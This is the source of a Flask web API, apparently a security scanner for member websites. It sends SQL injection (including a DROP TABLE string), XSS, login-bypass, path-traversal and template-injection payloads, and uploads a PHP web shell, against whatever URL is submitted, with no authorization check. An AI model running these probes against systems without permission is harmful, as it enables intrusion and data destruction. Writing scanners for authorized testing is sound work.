#!/usr/bin/env python3
"""
Security Assessment Tool - Backend API (Simplified Version)
A comprehensive security testing platform for member-based websites
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import socket
import ssl
import re
import json
import time
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin
import hashlib
import base64
import random
import string
from concurrent.futures import ThreadPoolExecutor
import logging
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Global variables for scan management
active_scans = {}
scan_results = {}

class SecurityScanner:
    """Main security scanner class"""
    
    def __init__(self, target_url, target_type, scan_depth):
        self.target_url = target_url
        self.target_type = target_type
        self.scan_depth = scan_depth
        self.vulnerabilities = []
        self.scan_progress = 0
        self.scan_status = "initializing"
        self.start_time = None
        self.end_time = None
        
        # Setup requests session with retry strategy
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
    def run_full_scan(self):
        """Execute comprehensive security scan"""
        self.start_time = datetime.now()
        self.scan_status = "running"
        
        try:
            # Define scan modules based on scan depth
            scan_modules = self.get_scan_modules()
            
            total_modules = len(scan_modules)
            
            for i, module in enumerate(scan_modules):
                logger.info(f"Running {module['name']}...")
                module['function']()
                
                # Update progress
                self.scan_progress = int((i + 1) / total_modules * 100)
                
                # Small delay to prevent overwhelming the target
                time.sleep(0.5)
            
            self.scan_status = "completed"
            self.end_time = datetime.now()
            
        except Exception as e:
            logger.error(f"Scan failed: {str(e)}")
            self.scan_status = "failed"
            self.end_time = datetime.now()
    
    def get_scan_modules(self):
        """Get list of scan modules based on scan depth"""
        base_modules = [
            {"name": "Port Scanning", "function": self.port_scan},
            {"name": "SSL/TLS Analysis", "function": self.ssl_analysis},
            {"name": "HTTP Headers Analysis", "function": self.headers_analysis},
            {"name": "Directory Enumeration", "function": self.directory_enumeration},
        ]
        
        if self.scan_depth in ["standard", "comprehensive", "penetration"]:
            base_modules.extend([
                {"name": "SQL Injection Testing", "function": self.sql_injection_test},
                {"name": "XSS Vulnerability Check", "function": self.xss_test},
                {"name": "Authentication Bypass", "function": self.auth_bypass_test},
                {"name": "CSRF Protection Check", "function": self.csrf_test},
            ])
        
        if self.scan_depth in ["comprehensive", "penetration"]:
            base_modules.extend([
                {"name": "Directory Traversal", "function": self.directory_traversal_test},
                {"name": "File Upload Vulnerabilities", "function": self.file_upload_test},
                {"name": "Session Management", "function": self.session_management_test},
                {"name": "Input Validation", "function": self.input_validation_test},
            ])
        
        return base_modules
    
    def port_scan(self):
        """Scan common ports for open services"""
        try:
            parsed_url = urlparse(self.target_url)
            host = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            
            # Common ports to scan
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 1433]
            
            open_ports = []
            for port_num in common_ports:
                if self.is_port_open(host, port_num):
                    open_ports.append(port_num)
            
            if len(open_ports) > 2:  # More than just HTTP/HTTPS
                self.add_vulnerability({
                    "name": "Multiple Open Ports",
                    "category": "Network",
                    "severity": "medium",
                    "description": f"Multiple ports are open: {', '.join(map(str, open_ports))}",
                    "impact": "Increased attack surface",
                    "recommendation": "Close unnecessary ports and services"
                })
                
        except Exception as e:
            logger.error(f"Port scan failed: {str(e)}")
    
    def is_port_open(self, host, port, timeout=3):
        """Check if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def ssl_analysis(self):
        """Analyze SSL/TLS configuration"""
        try:
            if not self.target_url.startswith('https://'):
                self.add_vulnerability({
                    "name": "No HTTPS",
                    "category": "SSL/TLS",
                    "severity": "high",
                    "description": "Website does not use HTTPS encryption",
                    "impact": "Data transmitted in plain text",
                    "recommendation": "Implement HTTPS with proper SSL/TLS configuration"
                })
                return
            
            parsed_url = urlparse(self.target_url)
            host = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Check certificate validity
                    if not cert:
                        self.add_vulnerability({
                            "name": "Invalid SSL Certificate",
                            "category": "SSL/TLS",
                            "severity": "high",
                            "description": "SSL certificate is invalid or self-signed",
                            "impact": "Man-in-the-middle attacks possible",
                            "recommendation": "Use valid SSL certificate from trusted CA"
                        })
                    
                    # Check cipher strength
                    if cipher and cipher[2] < 128:  # Key length
                        self.add_vulnerability({
                            "name": "Weak SSL Cipher",
                            "category": "SSL/TLS",
                            "severity": "medium",
                            "description": f"Weak SSL cipher used: {cipher[0]}",
                            "impact": "Encryption can be broken",
                            "recommendation": "Use strong SSL ciphers (AES-256, etc.)"
                        })
                        
        except Exception as e:
            logger.error(f"SSL analysis failed: {str(e)}")
    
    def headers_analysis(self):
        """Analyze HTTP security headers"""
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY or SAMEORIGIN',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000',
                'Content-Security-Policy': 'default-src \'self\'',
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }
            
            missing_headers = []
            for header, expected in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
            
            if missing_headers:
                self.add_vulnerability({
                    "name": "Missing Security Headers",
                    "category": "Headers",
                    "severity": "medium",
                    "description": f"Missing security headers: {', '.join(missing_headers)}",
                    "impact": "Reduced protection against common attacks",
                    "recommendation": "Implement missing security headers"
                })
                        
        except Exception as e:
            logger.error(f"Headers analysis failed: {str(e)}")
    
    def directory_enumeration(self):
        """Enumerate common directories and files"""
        try:
            common_paths = [
                '/admin', '/administrator', '/login', '/wp-admin', '/phpmyadmin',
                '/backup', '/config', '/test', '/dev', '/api', '/docs',
                '/robots.txt', '/sitemap.xml', '/.git', '/.env', '/config.php'
            ]
            
            found_paths = []
            for path in common_paths:
                try:
                    url = urljoin(self.target_url, path)
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code in [200, 301, 302, 403]:
                        found_paths.append(path)
                except:
                    continue
            
            if found_paths:
                self.add_vulnerability({
                    "name": "Sensitive Directories Exposed",
                    "category": "Information Disclosure",
                    "severity": "medium",
                    "description": f"Exposed directories: {', '.join(found_paths)}",
                    "impact": "Information disclosure",
                    "recommendation": "Restrict access to sensitive directories"
                })
                
        except Exception as e:
            logger.error(f"Directory enumeration failed: {str(e)}")
    
    def sql_injection_test(self):
        """Test for SQL injection vulnerabilities"""
        try:
            # Common SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "1' OR '1'='1' --"
            ]
            
            # Test common parameters
            test_params = ['id', 'user', 'search', 'q', 'page', 'category']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        # Test GET parameter
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        if self.detect_sql_error(response.text):
                            self.add_vulnerability({
                                "name": "SQL Injection Vulnerability",
                                "category": "Injection",
                                "severity": "critical",
                                "description": f"SQL injection found in parameter '{param}'",
                                "impact": "Database compromise possible",
                                "recommendation": "Use parameterized queries and input validation"
                            })
                            return
                    except:
                        continue
                        
        except Exception as e:
            logger.error(f"SQL injection test failed: {str(e)}")
    
    def detect_sql_error(self, response_text):
        """Detect SQL error messages in response"""
        sql_errors = [
            "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB Provider",
            "SQLServer JDBC Driver", "PostgreSQL query failed", "Warning: mysql_",
            "valid MySQL result", "MySqlClient.", "SQL syntax", "mysql_num_rows",
            "mysql_query", "mysql_fetch_assoc", "mysql_fetch_row", "mysql_numrows",
            "mysql_close", "mysql_connect", "mysql_pconnect", "mysql_select_db",
            "mysql_db_query", "mysql_result", "mysql_error", "mysql_errno",
            "mysql_affected_rows", "mysql_list_dbs", "mysql_list_tables",
            "mysql_list_fields", "mysql_data_seek", "mysql_insert_id",
            "mysql_field_name", "mysql_field_type", "mysql_field_len",
            "mysql_free_result", "mysql_get_client_info", "mysql_get_host_info",
            "mysql_get_proto_info", "mysql_get_server_info", "mysql_info",
            "mysql_ping", "mysql_stat", "mysql_thread_id", "mysql_unbuffered_query",
            "mysql_list_processes", "mysql_tablename", "mysql_field_table",
            "mysql_field_flags", "mysql_field_seek", "mysql_fetch_lengths",
            "mysql_fetch_field", "mysql_fetch_object", "mysql_fetch_array",
            "mysql_fetch_assoc", "mysql_fetch_row", "mysql_num_rows",
            "mysql_num_fields", "mysql_field_count", "mysql_affected_rows",
            "mysql_insert_id", "mysql_info", "mysql_stat", "mysql_thread_id",
            "mysql_ping", "mysql_get_client_info", "mysql_get_host_info",
            "mysql_get_proto_info", "mysql_get_server_info", "mysql_list_dbs",
            "mysql_list_tables", "mysql_list_fields", "mysql_data_seek",
            "mysql_field_name", "mysql_field_type", "mysql_field_len",
            "mysql_field_flags", "mysql_field_seek", "mysql_fetch_lengths",
            "mysql_fetch_field", "mysql_fetch_object", "mysql_free_result",
            "mysql_close", "mysql_connect", "mysql_pconnect", "mysql_select_db",
            "mysql_db_query", "mysql_result", "mysql_error", "mysql_errno",
            "mysql_unbuffered_query", "mysql_list_processes", "mysql_tablename",
            "mysql_field_table"
        ]
        
        response_lower = response_text.lower()
        for error in sql_errors:
            if error.lower() in response_lower:
                return True
        return False
    
    def xss_test(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        try:
            # Common XSS payloads
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>"
            ]
            
            # Test common parameters
            test_params = ['search', 'q', 'name', 'comment', 'message', 'input']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        # Test GET parameter
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        response_text = response.text
                        if payload in response_text and '<script>' in payload:
                            self.add_vulnerability({
                                "name": "Cross-Site Scripting (XSS)",
                                "category": "XSS",
                                "severity": "high",
                                "description": f"XSS vulnerability found in parameter '{param}'",
                                "impact": "Script injection and session hijacking",
                                "recommendation": "Implement proper input validation and output encoding"
                            })
                            return
                    except:
                        continue
                        
        except Exception as e:
            logger.error(f"XSS test failed: {str(e)}")
    
    def auth_bypass_test(self):
        """Test for authentication bypass vulnerabilities"""
        try:
            # Common authentication bypass techniques
            bypass_payloads = [
                "admin'--",
                "admin' OR '1'='1'--",
                "' OR 1=1--",
                "admin'/**/OR/**/1=1--",
                "' OR 'x'='x",
                "admin' OR 'a'='a'--"
            ]
            
            # Test common login endpoints
            login_endpoints = ['/login', '/admin/login', '/user/login', '/auth/login']
            
            for endpoint in login_endpoints:
                login_url = urljoin(self.target_url, endpoint)
                try:
                    response = self.session.get(login_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        # Try to find login form and test bypass
                        for payload in bypass_payloads:
                            data = {
                                'username': payload,
                                'password': 'password',
                                'user': payload,
                                'pass': 'password',
                                'email': payload,
                                'login': payload
                            }
                            
                            post_response = self.session.post(login_url, data=data, timeout=5, verify=False)
                            if post_response.status_code in [200, 302] and 'dashboard' in str(post_response.url).lower():
                                self.add_vulnerability({
                                    "name": "Authentication Bypass",
                                    "category": "Authentication",
                                    "severity": "critical",
                                    "description": f"Authentication bypass possible at {endpoint}",
                                    "impact": "Unauthorized access to protected areas",
                                    "recommendation": "Implement proper authentication and session management"
                                })
                                return
                except:
                    continue
                        
        except Exception as e:
            logger.error(f"Authentication bypass test failed: {str(e)}")
    
    def csrf_test(self):
        """Test for CSRF protection"""
        try:
            # Test common endpoints that might be vulnerable to CSRF
            csrf_endpoints = ['/admin', '/profile', '/settings', '/change-password']
            
            for endpoint in csrf_endpoints:
                test_url = urljoin(self.target_url, endpoint)
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        response_text = response.text
                        
                        # Check for CSRF token
                        csrf_indicators = [
                            'csrf_token', 'csrf-token', '_token', 'authenticity_token',
                            'csrfmiddlewaretoken', 'csrf', 'token'
                        ]
                        
                        has_csrf_protection = any(indicator in response_text.lower() for indicator in csrf_indicators)
                        
                        if not has_csrf_protection:
                            self.add_vulnerability({
                                "name": "Missing CSRF Protection",
                                "category": "CSRF",
                                "severity": "medium",
                                "description": f"No CSRF protection found at {endpoint}",
                                "impact": "Cross-site request forgery attacks possible",
                                "recommendation": "Implement CSRF tokens for state-changing operations"
                            })
                            return
                except:
                    continue
                        
        except Exception as e:
            logger.error(f"CSRF test failed: {str(e)}")
    
    def directory_traversal_test(self):
        """Test for directory traversal vulnerabilities"""
        try:
            # Common directory traversal payloads
            payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ]
            
            # Test common parameters
            test_params = ['file', 'path', 'page', 'include', 'doc', 'document']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        response_text = response.text
                        
                        # Check for signs of successful directory traversal
                        if any(indicator in response_text.lower() for indicator in ['root:', 'daemon:', 'bin:', 'sys:', 'adm:']):
                            self.add_vulnerability({
                                "name": "Directory Traversal",
                                "category": "Path Traversal",
                                "severity": "high",
                                "description": f"Directory traversal vulnerability in parameter '{param}'",
                                "impact": "Unauthorized file system access",
                                "recommendation": "Implement proper path validation and sanitization"
                            })
                            return
                    except:
                        continue
                        
        except Exception as e:
            logger.error(f"Directory traversal test failed: {str(e)}")
    
    def file_upload_test(self):
        """Test for file upload vulnerabilities"""
        try:
            # Test file upload endpoints
            upload_endpoints = ['/upload', '/file-upload', '/image-upload', '/document-upload']
            
            for endpoint in upload_endpoints:
                upload_url = urljoin(self.target_url, endpoint)
                try:
                    response = self.session.get(upload_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        # Try to upload malicious file
                        malicious_content = "<?php system($_GET['cmd']); ?>"
                        
                        files = {'file': ('test.php', malicious_content, 'application/octet-stream')}
                        
                        post_response = self.session.post(upload_url, files=files, timeout=5, verify=False)
                        if post_response.status_code == 200:
                            self.add_vulnerability({
                                "name": "Unrestricted File Upload",
                                "category": "File Upload",
                                "severity": "critical",
                                "description": f"File upload vulnerability at {endpoint}",
                                "impact": "Remote code execution possible",
                                "recommendation": "Implement file type validation and upload restrictions"
                            })
                            return
                except:
                    continue
                        
        except Exception as e:
            logger.error(f"File upload test failed: {str(e)}")
    
    def session_management_test(self):
        """Test session management security"""
        try:
            response = self.session.get(self.target_url, timeout=5, verify=False)
            cookies = response.cookies
            
            # Check for secure session cookies
            for cookie in cookies:
                if 'session' in cookie.name.lower() or 'jsessionid' in cookie.name.lower():
                    if not cookie.secure:
                        self.add_vulnerability({
                            "name": "Insecure Session Cookie",
                            "category": "Session Management",
                            "severity": "medium",
                            "description": "Session cookie not marked as secure",
                            "impact": "Session hijacking possible over HTTP",
                            "recommendation": "Mark session cookies as secure and httpOnly"
                        })
                        return
                        
        except Exception as e:
            logger.error(f"Session management test failed: {str(e)}")
    
    def input_validation_test(self):
        """Test input validation"""
        try:
            # Test various input validation scenarios
            test_inputs = [
                "<script>alert('test')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>"
            ]
            
            # Test common parameters
            test_params = ['search', 'q', 'name', 'email', 'comment', 'message']
            
            for param in test_params:
                for test_input in test_inputs:
                    try:
                        test_url = f"{self.target_url}?{param}={test_input}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        response_text = response.text
                        
                        # Check if input is reflected without proper encoding
                        if test_input in response_text:
                            self.add_vulnerability({
                                "name": "Insufficient Input Validation",
                                "category": "Input Validation",
                                "severity": "medium",
                                "description": f"Input validation issue in parameter '{param}'",
                                "impact": "Potential for various injection attacks",
                                "recommendation": "Implement comprehensive input validation and output encoding"
                            })
                            return
                    except:
                        continue
                        
        except Exception as e:
            logger.error(f"Input validation test failed: {str(e)}")
    
    def add_vulnerability(self, vuln):
        """Add vulnerability to the results"""
        vuln['id'] = f"vuln_{len(self.vulnerabilities) + 1}"
        vuln['timestamp'] = datetime.now().isoformat()
        self.vulnerabilities.append(vuln)
    
    def calculate_score(self):
        """Calculate overall security score"""
        if not self.vulnerabilities:
            return 90
        
        # Base score
        base_score = 100
        
        # Deduct points based on severity
        severity_penalties = {
            'critical': 25,
            'high': 15,
            'medium': 10,
            'low': 5
        }
        
        for vuln in self.vulnerabilities:
            base_score -= severity_penalties.get(vuln['severity'], 5)
        
        # Ensure score is within bounds (20-90)
        return max(20, min(90, base_score))
    
    def get_scan_summary(self):
        """Get scan summary"""
        return {
            'target_url': self.target_url,
            'target_type': self.target_type,
            'scan_depth': self.scan_depth,
            'overall_score': self.calculate_score(),
            'vulnerabilities': self.vulnerabilities,
            'scan_time': (self.end_time - self.start_time).total_seconds() if self.end_time and self.start_time else 0,
            'scan_status': self.scan_status,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'end_time': self.end_time.isoformat() if self.end_time else None,
            'recommendations': self.generate_recommendations()
        }
    
    def generate_recommendations(self):
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if not self.vulnerabilities:
            recommendations.append({
                'title': 'Maintain Current Security Posture',
                'description': 'Your system shows good security practices. Continue regular security assessments.',
                'priority': 'low'
            })
        else:
            # Group vulnerabilities by category
            categories = {}
            for vuln in self.vulnerabilities:
                category = vuln['category']
                if category not in categories:
                    categories[category] = []
                categories[category].append(vuln)
            
            # Generate recommendations based on categories
            if 'Injection' in categories:
                recommendations.append({
                    'title': 'Implement Input Validation and Parameterized Queries',
                    'description': 'Add comprehensive input validation and use parameterized queries to prevent injection attacks.',
                    'priority': 'critical'
                })
            
            if 'XSS' in categories:
                recommendations.append({
                    'title': 'Implement Output Encoding',
                    'description': 'Encode all user input before displaying it to prevent XSS attacks.',
                    'priority': 'high'
                })
            
            if 'Authentication' in categories:
                recommendations.append({
                    'title': 'Strengthen Authentication Mechanisms',
                    'description': 'Implement proper authentication, session management, and access controls.',
                    'priority': 'critical'
                })
            
            if 'SSL/TLS' in categories:
                recommendations.append({
                    'title': 'Improve SSL/TLS Configuration',
                    'description': 'Use valid SSL certificates and strong encryption protocols.',
                    'priority': 'high'
                })
            
            if 'Headers' in categories:
                recommendations.append({
                    'title': 'Implement Security Headers',
                    'description': 'Add security headers like CSP, HSTS, and X-Frame-Options.',
                    'priority': 'medium'
                })
            
            # General recommendations
            recommendations.extend([
                {
                    'title': 'Regular Security Audits',
                    'description': 'Schedule regular security assessments and penetration testing.',
                    'priority': 'medium'
                },
                {
                    'title': 'Security Training',
                    'description': 'Provide security training for development and operations teams.',
                    'priority': 'medium'
                }
            ])
        
        return recommendations

# API Routes
@app.route('/')
def index():
    """Serve the main HTML file"""
    return send_from_directory('.', 'index.html')

@app.route('/api/scan', methods=['POST'])
def start_scan():
    """Start a new security scan"""
    try:
        data = request.get_json()
        target_url = data.get('target_url')
        target_type = data.get('target_type')
        scan_depth = data.get('scan_depth', 'standard')
        
        if not target_url or not target_type:
            return jsonify({'error': 'Missing required parameters'}), 400
        
        # Generate scan ID
        scan_id = hashlib.md5(f"{target_url}{target_type}{scan_depth}{time.time()}".encode()).hexdigest()[:16]
        
        # Create scanner instance
        scanner = SecurityScanner(target_url, target_type, scan_depth)
        active_scans[scan_id] = scanner
        
        # Start scan in background
        def run_scan():
            scanner.run_full_scan()
            scan_results[scan_id] = scanner.get_scan_summary()
            del active_scans[scan_id]
        
        thread = threading.Thread(target=run_scan)
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'scan_id': scan_id,
            'status': 'started',
            'message': 'Security scan started successfully'
        })
        
    except Exception as e:
        logger.error(f"Error starting scan: {str(e)}")
        return jsonify({'error': 'Failed to start scan'}), 500

@app.route('/api/scan/<scan_id>/status', methods=['GET'])
def get_scan_status(scan_id):
    """Get scan status and progress"""
    try:
        if scan_id in active_scans:
            scanner = active_scans[scan_id]
            return jsonify({
                'scan_id': scan_id,
                'status': scanner.scan_status,
                'progress': scanner.scan_progress,
                'vulnerabilities_found': len(scanner.vulnerabilities)
            })
        elif scan_id in scan_results:
            return jsonify({
                'scan_id': scan_id,
                'status': 'completed',
                'progress': 100,
                'results_available': True
            })
        else:
            return jsonify({'error': 'Scan not found'}), 404
            
    except Exception as e:
        logger.error(f"Error getting scan status: {str(e)}")
        return jsonify({'error': 'Failed to get scan status'}), 500

@app.route('/api/scan/<scan_id>/results', methods=['GET'])
def get_scan_results(scan_id):
    """Get scan results"""
    try:
        if scan_id in scan_results:
            return jsonify(scan_results[scan_id])
        else:
            return jsonify({'error': 'Results not available'}), 404
            
    except Exception as e:
        logger.error(f"Error getting scan results: {str(e)}")
        return jsonify({'error': 'Failed to get scan results'}), 500

@app.route('/api/scan/<scan_id>', methods=['DELETE'])
def cancel_scan(scan_id):
    """Cancel an active scan"""
    try:
        if scan_id in active_scans:
            del active_scans[scan_id]
            return jsonify({'message': 'Scan cancelled successfully'})
        else:
            return jsonify({'error': 'Scan not found'}), 404
            
    except Exception as e:
        logger.error(f"Error cancelling scan: {str(e)}")
        return jsonify({'error': 'Failed to cancel scan'}), 500

@app.route('/api/scans', methods=['GET'])
def list_scans():
    """List all scans"""
    try:
        active_scan_list = []
        for scan_id, scanner in active_scans.items():
            active_scan_list.append({
                'scan_id': scan_id,
                'target_url': scanner.target_url,
                'status': scanner.scan_status,
                'progress': scanner.scan_progress
            })
        
        completed_scan_list = []
        for scan_id, results in scan_results.items():
            completed_scan_list.append({
                'scan_id': scan_id,
                'target_url': results['target_url'],
                'status': 'completed',
                'overall_score': results['overall_score']
            })
        
        return jsonify({
            'active_scans': active_scan_list,
            'completed_scans': completed_scan_list
        })
        
    except Exception as e:
        logger.error(f"Error listing scans: {str(e)}")
        return jsonify({'error': 'Failed to list scans'}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
